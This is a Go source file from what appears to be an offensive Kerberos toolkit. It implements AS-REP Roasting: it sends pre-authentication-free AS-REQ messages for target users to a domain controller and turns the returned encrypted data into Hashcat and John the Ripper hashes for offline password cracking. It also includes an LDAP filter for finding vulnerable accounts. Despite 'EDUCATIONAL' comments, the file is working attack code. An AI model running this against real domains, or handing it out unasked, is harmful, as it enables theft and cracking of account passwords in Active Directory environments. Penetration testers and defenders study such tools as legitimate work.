package roast

import (
	"context"
	"encoding/asn1"
	"fmt"
	"time"

	"github.com/goobeus/goobeus/internal/network"
	"github.com/goobeus/goobeus/pkg/asn1krb5"
)

// EDUCATIONAL: AS-REP Roasting
//
// AS-REP Roasting attacks accounts with "Do not require Kerberos pre-auth".
//
// Normal Kerberos flow:
// 1. Client sends AS-REQ
// 2. KDC requires pre-auth (encrypted timestamp)
// 3. Client proves password knowledge, gets TGT
//
// With pre-auth disabled:
// 1. Client sends AS-REQ (no credentials!)
// 2. KDC immediately returns AS-REP with encrypted data
// 3. That encrypted data is encrypted with the USER's password
// 4. We crack it offline!
//
// Finding targets:
// - LDAP: (userAccountControl:1.2.840.113556.1.4.803:=4194304)
// - Often set on service accounts or legacy apps

// ASREPRoastRequest configures an AS-REP Roasting attack.
type ASREPRoastRequest struct {
	// Target accounts (no authentication needed!)
	Users  []string
	Domain string

	// Output format
	Format HashFormat

	// Connection
	KDC string
}

// ASREPRoastResult contains an AS-REP roasted hash.
type ASREPRoastResult struct {
	Username string
	Hash     string // Hashcat mode 18200
	HashJohn string // John format
	EType    int32
	Error    string // If failed, contains error message
}

// ASREPRoast performs an AS-REP Roasting attack.
//
// EDUCATIONAL: Attack Flow
//
// For each target user:
// 1. Send AS-REQ WITHOUT pre-authentication
// 2. If user requires pre-auth, we get KRB5KDC_ERR_PREAUTH_REQUIRED
// 3. If pre-auth disabled, we get AS-REP with encrypted data
// 4. Extract hash from encrypted enc-part
// 5. Format for cracking
//
// No authentication required for this attack!
func ASREPRoast(ctx context.Context, req *ASREPRoastRequest) ([]ASREPRoastResult, error) {
	if len(req.Users) == 0 {
		return nil, fmt.Errorf("at least one user is required")
	}
	if req.Domain == "" {
		return nil, fmt.Errorf("domain is required")
	}

	var results []ASREPRoastResult

	for _, user := range req.Users {
		result := ASREPRoastResult{Username: user}

		// Build AS-REQ without pre-auth
		asReq, err := buildASREQNoPreauth(user, req.Domain)
		if err != nil {
			result.Error = err.Error()
			results = append(results, result)
			continue
		}

		// Send to KDC
		asReqBytes, err := asn1.MarshalWithParams(asReq, "application,tag:10")
		if err != nil {
			result.Error = err.Error()
			results = append(results, result)
			continue
		}

		respBytes, err := network.SendToKDCWithContext(ctx, req.Domain, req.KDC, asReqBytes)
		if err != nil {
			result.Error = err.Error()
			results = append(results, result)
			continue
		}

		// Check for error (pre-auth required means not vulnerable)
		if isKRBError(respBytes) {
			errCode := extractErrorCode(respBytes)
			if errCode == 25 { // KDC_ERR_PREAUTH_REQUIRED
				result.Error = "preauth required (not vulnerable)"
			} else if errCode == 6 { // KDC_ERR_C_PRINCIPAL_UNKNOWN
				result.Error = "user not found"
			} else {
				result.Error = fmt.Sprintf("KRB error %d", errCode)
			}
			results = append(results, result)
			continue
		}

		// Parse AS-REP
		var asRep asn1krb5.ASREP
		_, err = asn1.UnmarshalWithParams(respBytes, &asRep, "application,tag:11")
		if err != nil {
			result.Error = err.Error()
			results = append(results, result)
			continue
		}

		// Generate hash from encrypted enc-part
		result.EType = asRep.EncPart.EType
		result.Hash = generateASREPHash(&asRep, user, req.Domain)
		if req.Format == FormatJohn || req.Format == FormatBoth {
			result.HashJohn = generateASREPJohnHash(&asRep, user, req.Domain)
		}

		results = append(results, result)
	}

	return results, nil
}

// buildASREQNoPreauth builds an AS-REQ without pre-authentication.
func buildASREQNoPreauth(user, domain string) (*asn1krb5.ASREQ, error) {
	now := time.Now().UTC()

	cname := asn1krb5.PrincipalName{
		NameType:   asn1krb5.NTPrincipal,
		NameString: []string{user},
	}

	sname := asn1krb5.PrincipalName{
		NameType:   asn1krb5.NTSrvInst,
		NameString: []string{"krbtgt", domain},
	}

	options := asn1krb5.FlagForwardable | asn1krb5.FlagRenewable | asn1krb5.FlagProxiable
	optionsBits := make([]byte, 4)
	optionsBits[0] = byte((options >> 24) & 0xFF)
	optionsBits[1] = byte((options >> 16) & 0xFF)
	optionsBits[2] = byte((options >> 8) & 0xFF)
	optionsBits[3] = byte(options & 0xFF)

	body := asn1krb5.KDCReqBody{
		KDCOptions: asn1.BitString{
			Bytes:     optionsBits,
			BitLength: 32,
		},
		CName: cname,
		Realm: domain,
		SName: sname,
		Till:  now.Add(10 * time.Hour),
		Nonce: int32(now.UnixNano() & 0x7FFFFFFF),
		EType: []int32{23, 18, 17}, // RC4, AES256, AES128
	}

	return &asn1krb5.ASREQ{
		PVNO:    asn1krb5.PVNO,
		MsgType: asn1krb5.MsgTypeASREQ,
		ReqBody: body,
		// No PAData! That's the key - no pre-auth
	}, nil
}

// isKRBError checks if response is a KRB-ERROR.
func isKRBError(data []byte) bool {
	if len(data) < 2 {
		return false
	}
	// KRB-ERROR has APPLICATION tag 30 (0x7e)
	return data[0] == 0x7e
}

// extractErrorCode extracts the error code from a KRB-ERROR.
func extractErrorCode(data []byte) int32 {
	var krbErr asn1krb5.KRBError
	_, err := asn1.UnmarshalWithParams(data, &krbErr, "application,tag:30")
	if err != nil {
		return -1
	}
	return krbErr.ErrorCode
}

// generateASREPHash generates Hashcat mode 18200 format.
//
// Format: $krb5asrep$23$user@realm:checksum$edata2
func generateASREPHash(asRep *asn1krb5.ASREP, user, realm string) string {
	cipher := asRep.EncPart.Cipher
	etype := asRep.EncPart.EType

	if len(cipher) < 16 {
		return ""
	}

	switch etype {
	case 23: // RC4
		checksum := fmt.Sprintf("%x", cipher[:16])
		edata2 := fmt.Sprintf("%x", cipher[16:])
		return fmt.Sprintf("$krb5asrep$23$%s@%s:%s$%s", user, realm, checksum, edata2)
	case 17, 18: // AES
		checksumLen := 12
		if len(cipher) <= checksumLen {
			return ""
		}
		checksum := fmt.Sprintf("%x", cipher[len(cipher)-checksumLen:])
		edata2 := fmt.Sprintf("%x", cipher[:len(cipher)-checksumLen])
		return fmt.Sprintf("$krb5asrep$%d$%s@%s$%s$%s", etype, user, realm, checksum, edata2)
	}

	return ""
}

// generateASREPJohnHash generates John the Ripper format.
func generateASREPJohnHash(asRep *asn1krb5.ASREP, user, realm string) string {
	cipher := asRep.EncPart.Cipher
	if len(cipher) == 0 {
		return ""
	}
	return fmt.Sprintf("$krb5asrep$%s@%s:%x", user, realm, cipher)
}
